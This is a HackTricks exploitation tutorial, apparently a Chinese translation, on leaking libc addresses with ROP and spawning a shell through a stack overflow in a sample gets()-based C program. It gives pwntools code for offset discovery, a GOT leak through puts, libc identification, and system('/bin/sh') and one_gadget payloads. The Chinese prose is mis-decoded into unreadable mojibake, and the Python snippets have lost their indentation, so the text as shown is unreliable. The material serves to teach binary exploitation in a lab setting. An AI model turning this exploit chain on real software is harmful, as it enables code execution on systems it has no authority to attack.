# ä½¿ç”¨ ROP æ³„éœ² libc åœ°å€

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## å¿«é€Ÿæ¦‚è¿°

1. **æ‰¾åˆ°** æº¢å‡º **åç§»é‡**
2. **æ‰¾åˆ°** `POP_RDI` gadgetã€`PUTS_PLT` å’Œ `MAIN` gadgets
3. ä½¿ç”¨ä¹‹å‰çš„ gadgets **æ³„éœ² puts æˆ–å…¶ä»– libc å‡½æ•°çš„å†…å­˜åœ°å€** å¹¶ **æ‰¾åˆ° libc ç‰ˆæœ¬** ([ä¸‹è½½å®ƒ](https://libc.blukat.me))
4. ä½¿ç”¨åº“ï¼Œ**è®¡ç®— ROP å¹¶è¿›è¡Œåˆ©ç”¨**

## å…¶ä»–æ•™ç¨‹å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ä»¥ä¾›å®è·µ

æœ¬æ•™ç¨‹å°†åˆ©ç”¨æœ¬æ•™ç¨‹ä¸­æå‡ºçš„ä»£ç /äºŒè¿›åˆ¶æ–‡ä»¶ï¼š[https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
å¦ä¸€ä¸ªæœ‰ç”¨çš„æ•™ç¨‹ï¼š[https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/)ï¼Œ[https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## ä»£ç 

æ–‡ä»¶åï¼š`vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## ROP - æ³„éœ² LIBC æ¨¡æ¿

ä¸‹è½½æ¼æ´åˆ©ç”¨ç¨‹åºå¹¶å°†å…¶æ”¾ç½®åœ¨ä¸æ˜“å—æ”»å‡»çš„äºŒè¿›åˆ¶æ–‡ä»¶ç›¸åŒçš„ç›®å½•ä¸­ï¼Œå¹¶å‘è„šæœ¬æä¾›æ‰€éœ€çš„æ•°æ®ï¼š

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- æŸ¥æ‰¾åç§»é‡

æ¨¡æ¿åœ¨ç»§ç»­è¿›è¡Œæ¼æ´åˆ©ç”¨ä¹‹å‰éœ€è¦ä¸€ä¸ªåç§»é‡ã€‚å¦‚æœæä¾›äº†ä»»ä½•åç§»é‡ï¼Œå®ƒå°†æ‰§è¡Œå¿…è¦çš„ä»£ç æ¥æŸ¥æ‰¾å®ƒï¼ˆé»˜è®¤ `OFFSET = ""`ï¼‰ï¼š
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**æ‰§è¡Œ** `python template.py` å°†æ‰“å¼€ä¸€ä¸ª GDB æ§åˆ¶å°ï¼Œç¨‹åºå°†å´©æºƒã€‚åœ¨è¯¥ **GDB æ§åˆ¶å°** ä¸­æ‰§è¡Œ `x/wx $rsp` ä»¥è·å–å°†è¦è¦†ç›– RIP çš„ **å­—èŠ‚**ã€‚æœ€åä½¿ç”¨ **python** æ§åˆ¶å°è·å– **åç§»é‡**ï¼š
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../.gitbook/assets/image (1007).png>)

åœ¨æ‰¾åˆ°åç§»é‡ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ä¸º 40ï¼‰åï¼Œä½¿ç”¨è¯¥å€¼æ›´æ”¹æ¨¡æ¿ä¸­çš„ OFFSET å˜é‡ã€‚\
`OFFSET = "A" * 40`

å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ï¼š `pattern create 1000` -- _æ‰§è¡Œç›´åˆ° ret_ -- `pattern seach $rsp` ä» GEFã€‚

## 2- å¯»æ‰¾ Gadgets

ç°åœ¨æˆ‘ä»¬éœ€è¦åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ° ROP gadgetsã€‚è¿™äº› ROP gadgets å°†ç”¨äºè°ƒç”¨ `puts` ä»¥æ‰¾åˆ°æ­£åœ¨ä½¿ç”¨çš„ **libc**ï¼Œå¹¶éšå **å¯åŠ¨æœ€ç»ˆçš„åˆ©ç”¨**ã€‚
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
The `PUTS_PLT` æ˜¯è°ƒç”¨ **function puts** æ‰€éœ€çš„ã€‚\
The `MAIN_PLT` æ˜¯åœ¨ä¸€æ¬¡äº¤äº’åå†æ¬¡è°ƒç”¨ **main function** ä»¥ **exploit** æº¢å‡º **again**ï¼ˆæ— é™è½®æ¬¡çš„åˆ©ç”¨ï¼‰æ‰€éœ€çš„ã€‚**å®ƒåœ¨æ¯ä¸ª ROP çš„æœ«å°¾ç”¨äºå†æ¬¡è°ƒç”¨ç¨‹åº**ã€‚\
The **POP\_RDI** æ˜¯ **pass** ä¸€ä¸ª **parameter** ç»™è¢«è°ƒç”¨çš„å‡½æ•°æ‰€éœ€çš„ã€‚

åœ¨è¿™ä¸€æ­¥ä½ ä¸éœ€è¦æ‰§è¡Œä»»ä½•æ“ä½œï¼Œå› ä¸ºæ‰€æœ‰å†…å®¹å°†åœ¨æ‰§è¡ŒæœŸé—´ç”± pwntools æ‰¾åˆ°ã€‚

## 3- æŸ¥æ‰¾ libc åº“

ç°åœ¨æ˜¯æ—¶å€™æ‰¾å‡ºæ­£åœ¨ä½¿ç”¨çš„ **libc** åº“çš„ç‰ˆæœ¬äº†ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°† **leak** **function** `puts` åœ¨å†…å­˜ä¸­çš„ **address**ï¼Œç„¶åæˆ‘ä»¬å°† **search** åœ¨è¯¥åœ°å€ä¸­ **library version** çš„ puts ç‰ˆæœ¬ã€‚
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæ‰§è¡Œä»£ç ä¸­æœ€é‡è¦çš„ä¸€è¡Œæ˜¯ï¼š
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
è¿™å°†å‘é€ä¸€äº›å­—èŠ‚ï¼Œç›´åˆ°**è¦†ç›–****RIP**æˆä¸ºå¯èƒ½ï¼š`OFFSET`ã€‚\
ç„¶åï¼Œå®ƒå°†è®¾ç½®å°å·¥å…·`POP_RDI`çš„**åœ°å€**ï¼Œä»¥ä¾¿ä¸‹ä¸€ä¸ªåœ°å€ï¼ˆ`FUNC_GOT`ï¼‰å°†è¢«ä¿å­˜åœ¨**RDI**å¯„å­˜å™¨ä¸­ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬æƒ³è¦**è°ƒç”¨ puts**ï¼Œ**ä¼ é€’**å®ƒ`PUTS_GOT`çš„**åœ°å€**ï¼Œå› ä¸º puts å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ä¿å­˜åœ¨æŒ‡å‘`PUTS_GOT`çš„åœ°å€ä¸­ã€‚\
ä¹‹åï¼Œå°†è°ƒç”¨`PUTS_PLT`ï¼ˆåœ¨**RDI**ä¸­åŒ…å«`PUTS_GOT`ï¼‰ï¼Œå› æ­¤ puts å°†**è¯»å–**`PUTS_GOT`ä¸­çš„å†…å®¹ï¼ˆ**å†…å­˜ä¸­ puts å‡½æ•°çš„åœ°å€**ï¼‰å¹¶å°†å…¶**æ‰“å°å‡ºæ¥**ã€‚\
æœ€åï¼Œ**å†æ¬¡è°ƒç”¨ä¸»å‡½æ•°**ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥å†æ¬¡åˆ©ç”¨æº¢å‡ºã€‚

é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å·²ç»**æ¬ºéª—äº† puts å‡½æ•°**ï¼Œä½¿å…¶**æ‰“å°**å‡º**å†…å­˜**ä¸­å‡½æ•°**puts**çš„**åœ°å€**ï¼ˆè¯¥åœ°å€ä½äº**libc**åº“ä¸­ï¼‰ã€‚ç°åœ¨æˆ‘ä»¬æœ‰äº†è¿™ä¸ªåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥**æœç´¢æ­£åœ¨ä½¿ç”¨çš„ libc ç‰ˆæœ¬**ã€‚

![](<../../../../.gitbook/assets/image (1049).png>)

ç”±äºæˆ‘ä»¬æ­£åœ¨**åˆ©ç”¨**æŸä¸ª**æœ¬åœ°**äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› æ­¤**ä¸éœ€è¦**å¼„æ¸…æ¥šæ­£åœ¨ä½¿ç”¨å“ªä¸ªç‰ˆæœ¬çš„**libc**ï¼ˆåªéœ€åœ¨`/lib/x86_64-linux-gnu/libc.so.6`ä¸­æ‰¾åˆ°åº“ï¼‰ã€‚\
ä½†æ˜¯ï¼Œåœ¨è¿œç¨‹åˆ©ç”¨çš„æƒ…å†µä¸‹ï¼Œæˆ‘å°†åœ¨è¿™é‡Œè§£é‡Šå¦‚ä½•æ‰¾åˆ°å®ƒï¼š

### 3.1- æœç´¢ libc ç‰ˆæœ¬ (1)

æ‚¨å¯ä»¥åœ¨ç½‘é¡µä¸Šæœç´¢æ­£åœ¨ä½¿ç”¨çš„åº“ï¼š[https://libc.blukat.me/](https://libc.blukat.me)\
å®ƒè¿˜å…è®¸æ‚¨ä¸‹è½½å‘ç°çš„**libc**ç‰ˆæœ¬ã€‚

![](<../../../../.gitbook/assets/image (221).png>)

### 3.2- æœç´¢ libc ç‰ˆæœ¬ (2)

æ‚¨è¿˜å¯ä»¥æ‰§è¡Œï¼š

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

è¿™å°†éœ€è¦ä¸€äº›æ—¶é—´ï¼Œè¯·è€å¿ƒç­‰å¾…ã€‚\
ä¸ºäº†ä½¿å…¶å·¥ä½œï¼Œæˆ‘ä»¬éœ€è¦ï¼š

* Libc ç¬¦å·åç§°ï¼š`puts`
* æ³„éœ²çš„ libc åœ°å€ï¼š`0x7ff629878690`

æˆ‘ä»¬å¯ä»¥æ‰¾å‡ºæœ€æœ‰å¯èƒ½ä½¿ç”¨çš„**libc**ã€‚
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
æˆ‘ä»¬å¾—åˆ°äº†ä¸¤ä¸ªåŒ¹é…ï¼ˆå¦‚æœç¬¬ä¸€ä¸ªä¸å·¥ä½œï¼Œä½ åº”è¯¥å°è¯•ç¬¬äºŒä¸ªï¼‰ã€‚ä¸‹è½½ç¬¬ä¸€ä¸ªï¼š
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
å°† `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` ä¸­çš„ libc å¤åˆ¶åˆ°æˆ‘ä»¬çš„å·¥ä½œç›®å½•ã€‚

### 3.3- å…¶ä»–æ³„éœ²å‡½æ•°
```python
puts
printf
__libc_start_main
read
gets
```
## 4- æŸ¥æ‰¾åŸºç¡€ libc åœ°å€ä¸åˆ©ç”¨

åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘ä»¬åº”è¯¥çŸ¥é“ä½¿ç”¨çš„ libc åº“ã€‚ç”±äºæˆ‘ä»¬æ­£åœ¨åˆ©ç”¨ä¸€ä¸ªæœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ‘å°†ä½¿ç”¨ï¼š`/lib/x86_64-linux-gnu/libc.so.6`

å› æ­¤ï¼Œåœ¨ `template.py` çš„å¼€å¤´å°† **libc** å˜é‡æ›´æ”¹ä¸ºï¼š `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #è®¾ç½®åº“è·¯å¾„å½“çŸ¥é“å®ƒæ—¶`

ç»™ **libc åº“** æä¾› **è·¯å¾„** åï¼Œ**åˆ©ç”¨çš„å…¶ä½™éƒ¨åˆ†å°†ä¼šè‡ªåŠ¨è®¡ç®—**ã€‚

åœ¨ `get_addr` å‡½æ•°å†…éƒ¨ï¼Œ**libc çš„åŸºåœ°å€** å°†ä¼šè¢«è®¡ç®—ï¼š
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
æ³¨æ„ **æœ€ç»ˆçš„ libc åŸºåœ°å€å¿…é¡»ä»¥ 00 ç»“å°¾**ã€‚å¦‚æœä¸æ˜¯è¿™ç§æƒ…å†µï¼Œæ‚¨å¯èƒ½æ³„éœ²äº†ä¸æ­£ç¡®çš„åº“ã€‚
{% endhint %}

ç„¶åï¼Œå‡½æ•° `system` çš„åœ°å€å’Œå­—ç¬¦ä¸² _"/bin/sh"_ çš„ **åœ°å€** å°†ä» **libc** çš„ **åŸºåœ°å€** è®¡ç®—å¾—å‡ºï¼Œå¹¶ç»™å®š **libc åº“**ã€‚
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
æœ€åï¼Œå°†å‡†å¤‡å‘é€ /bin/sh æ‰§è¡Œæ¼æ´ï¼š
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
è®©æˆ‘ä»¬è§£é‡Šè¿™ä¸ªæœ€ç»ˆçš„ ROPã€‚\
æœ€åçš„ ROP (`rop1`) å†æ¬¡è°ƒç”¨äº†ä¸»å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥ **å†æ¬¡åˆ©ç”¨** è¿™ä¸ª **æº¢å‡º**ï¼ˆè¿™å°±æ˜¯ `OFFSET` å†æ¬¡å‡ºç°çš„åŸå› ï¼‰ã€‚ç„¶åï¼Œæˆ‘ä»¬æƒ³è¦è°ƒç”¨ `POP_RDI` æŒ‡å‘ _"/bin/sh"_ çš„ **åœ°å€** (`BINSH`)ï¼Œå¹¶è°ƒç”¨ **system** å‡½æ•° (`SYSTEM`)ï¼Œå› ä¸º _"/bin/sh"_ çš„åœ°å€å°†ä½œä¸ºå‚æ•°ä¼ é€’ã€‚\
æœ€åï¼Œ**é€€å‡ºå‡½æ•°çš„åœ°å€** è¢« **è°ƒç”¨**ï¼Œè¿™æ ·è¿›ç¨‹ **ä¼˜é›…åœ°é€€å‡º**ï¼Œä¸ä¼šç”Ÿæˆä»»ä½•è­¦æŠ¥ã€‚

**è¿™æ ·ï¼Œåˆ©ç”¨å°†æ‰§è¡Œä¸€ä¸ª \_/bin/sh**\_\*\* shell.\*\*

![](<../../../../.gitbook/assets/image (165).png>)

## 4(2)- ä½¿ç”¨ ONE\_GADGET

ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ [**ONE\_GADGET** ](https://github.com/david942j/one\_gadget) æ¥è·å–ä¸€ä¸ª shellï¼Œè€Œä¸æ˜¯ä½¿ç”¨ **system** å’Œ **"/bin/sh"**ã€‚**ONE\_GADGET** å°†åœ¨ libc åº“ä¸­æ‰¾åˆ°ä¸€äº›æ–¹æ³•ï¼Œåªéœ€ä¸€ä¸ª **ROP åœ°å€** å³å¯è·å¾— shellã€‚\
ç„¶è€Œï¼Œé€šå¸¸ä¼šæœ‰ä¸€äº›é™åˆ¶ï¼Œæœ€å¸¸è§ä¸”å®¹æ˜“é¿å…çš„é™åˆ¶æ˜¯ `[rsp+0x30] == NULL`ã€‚ç”±äºä½ æ§åˆ¶ **RSP** ä¸­çš„å€¼ï¼Œä½ åªéœ€å‘é€ä¸€äº›æ›´å¤šçš„ NULL å€¼ï¼Œä»¥ä¾¿é¿å…è¿™ä¸ªé™åˆ¶ã€‚

![](<../../../../.gitbook/assets/image (754).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## EXPLOIT FILE

æ‚¨å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°åˆ©ç”¨æ­¤æ¼æ´çš„æ¨¡æ¿ï¼š

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## å¸¸è§é—®é¢˜

### MAIN\_PLT = elf.symbols\['main'] æœªæ‰¾åˆ°

å¦‚æœâ€œmainâ€ç¬¦å·ä¸å­˜åœ¨ã€‚ç„¶åæ‚¨å¯ä»¥æ‰¾åˆ°ä¸»ä»£ç çš„ä½ç½®ï¼š
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
å¹¶æ‰‹åŠ¨è®¾ç½®åœ°å€ï¼š
```python
MAIN_PLT = 0x401080
```
### Putsæœªæ‰¾åˆ°

å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰ä½¿ç”¨Putsï¼Œæ‚¨åº”è¯¥æ£€æŸ¥å®ƒæ˜¯å¦ä½¿ç”¨

### `sh: 1: %s%s%s%s%s%s%s%s: æœªæ‰¾åˆ°`

å¦‚æœåœ¨åˆ›å»º**æ‰€æœ‰**æ¼æ´åˆ©ç”¨åå‘ç°æ­¤**é”™è¯¯**ï¼š`sh: 1: %s%s%s%s%s%s%s%s: æœªæ‰¾åˆ°`

å°è¯•**ä»â€œ/bin/shâ€çš„åœ°å€ä¸­å‡å»64å­—èŠ‚**ï¼š
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
